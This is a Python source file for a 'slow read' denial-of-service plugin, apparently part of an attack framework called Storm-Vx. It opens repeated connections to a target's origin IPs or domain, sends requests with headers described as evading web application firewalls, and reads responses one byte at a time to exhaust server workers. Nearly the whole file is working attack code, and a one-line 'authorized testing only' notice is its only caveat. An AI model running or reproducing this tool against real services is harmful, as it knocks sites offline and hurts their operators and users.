#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_slow_read — Slow Read Attack Plugin (v25 P1)

Opens connections to origin IPs and reads responses very slowly,
keeping server threads/workers occupied. This is the inverse of
Slowloris — instead of sending slowly, we read slowly.

v25 P1: Fixed SSL bug (missing server_hostname), now works without
origin IPs (connects directly to target domain), and uses evasion-aware
headers for WAF bypass.

Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
import ssl
from typing import Dict, Any
from urllib.parse import urlparse


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin
from vf_common import C, rand_str
from config.defaults import RAW_CONNECT_TIMEOUT, WRITER_CLOSE_TIMEOUT

from logging_config import get_logger
logger = get_logger(__name__)


__all__ = ["SlowReadPlugin"]


class SlowReadPlugin(AttackPlugin):
    """Slow Read attack (v25: works with or without origin IPs).

    Opens TCP connections, sends a complete HTTP request, then
    reads the response extremely slowly (1 byte at a time with
    delays). This occupies server workers/threads for extended
    periods, similar to Slowloris but attacking response delivery.

    v25 P1: Fixed SSL context (was missing server_hostname parameter),
    now works without origin IPs by connecting directly to target domain,
    and uses evasion-aware headers.
    """

    meta = PluginMeta(
        name='slow_read',
        version='2.0.0',
        plugin_type='attack',
        description='Slow read — read responses slowly to occupy server workers (works with or without origin IPs)',
        tags=['origin', 'tcp', 'slow-read', 'worker-exhaust'],
        priority=38,
        compatible_profiles=[],
        requirements=[],
    )

    def __init__(self) -> None:
        super().__init__()
        # SSL context is now created per-worker based on verify_ssl setting (SEC-03)

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """Slow read worker: send request, read response very slowly."""
        origin_ips = context.origin_ips
        domain = context.domain
        target_is_https = urlparse(context.url).scheme == 'https'
        use_tls = context.extra.use_tls
        read_delay = getattr(context.extra, 'slow_read_delay', 3)  # seconds between reads
        read_chunk = getattr(context.extra, 'slow_read_chunk', 1)   # bytes per read

        # BUG-025: Use shared _create_ssl_context() from AttackPlugin base class
        # instead of duplicating SSL context creation logic
        ssl_ctx = self._create_ssl_context(context)

        # v25 P1: Work with or without origin IPs
        use_origin = bool(origin_ips)

        while not self._stop_event.is_set():
            try:
                # v25 P1: Choose connection target
                if use_origin:
                    target_host = random.choice(origin_ips)
                else:
                    target_host = domain

                port = 443 if use_tls else 80
                writer = None
                try:
                    # v25 P1: Fixed SSL — pass server_hostname for proper TLS handshake
                    if use_tls:
                        reader, writer = await asyncio.wait_for(
                            asyncio.open_connection(
                                target_host, port, ssl=ssl_ctx, server_hostname=domain),
                            timeout=RAW_CONNECT_TIMEOUT)  # W2.4
                    else:
                        reader, writer = await asyncio.wait_for(
                            asyncio.open_connection(target_host, port),
                            timeout=RAW_CONNECT_TIMEOUT)  # W2.4

                    # v25 P1: Use evasion-aware headers
                    headers = self._get_fresh_headers(context, "document")

                    # Send a complete HTTP request
                    request = (
                        f"GET /{rand_str(4)} HTTP/1.1\r\n"
                        f"Host: {domain}\r\n"
                        f"User-Agent: {headers.get('User-Agent', 'curl/7.88')}\r\n"
                        f"Accept: {headers.get('Accept', 'text/html,application/xhtml+xml')}\r\n"
                        f"Connection: keep-alive\r\n\r\n"
                    )
                    writer.write(request.encode())
                    await writer.drain()

                    # BUG-FIX v33: Record success immediately after connection +
                    # request send (same pattern as slowloris/conn_exhaust).
                    # Without this, if the attack is stopped or auto-shrinks during
                    # the slow read cycle (~3 minutes), the worker's activity is
                    # never counted, making slow_read appear inactive (t:0 tasks).
                    await self._record("SLOW-READ", True, 0, 0, hint="slow-read-conn")
                    self._on_request_result(worker_id, True)

                    # Read response very slowly
                    total_bytes = 0
                    for _ in range(60):  # Max ~3 minutes (60 * 3s)
                        if self._stop_event.is_set():
                            break
                        try:
                            chunk = await asyncio.wait_for(
                                reader.read(read_chunk), timeout=WRITER_CLOSE_TIMEOUT)  # W2.4
                            if not chunk:
                                break  # Connection closed
                            total_bytes += len(chunk)
                            await asyncio.sleep(read_delay)
                        except asyncio.TimeoutError:
                            break
                        except asyncio.CancelledError:
                            raise
                        except (OSError, ConnectionError) as exc:
                            logger.debug(f"Slow read chunk error: {exc}")
                            break

                    # BUG-FIX v33: Removed duplicate _record after slow read cycle.
                    # The early record at line 125 already captures the connection.
                    # Keeping this would double-count success/RPS like slowloris did.

                except asyncio.CancelledError:
                    raise
                except (OSError, ConnectionError, asyncio.TimeoutError, ssl.SSLError) as exc:
                    await self._record("SLOW-READ", False, 0, 0, err=type(exc).__name__)
                    self._on_request_result(worker_id, False)
                finally:
                    if writer:
                        try:
                            writer.close()
                            await asyncio.wait_for(writer.wait_closed(), timeout=WRITER_CLOSE_TIMEOUT)  # W2.4
                        except (OSError, RuntimeError, ConnectionError, asyncio.TimeoutError):
                            pass  # Cleanup errors are acceptable
            except asyncio.CancelledError:
                return
            except (OSError, ConnectionError, asyncio.TimeoutError) as exc:
                logger.debug(f"Slow read worker {worker_id} outer error: {exc}")
                await asyncio.sleep(1)


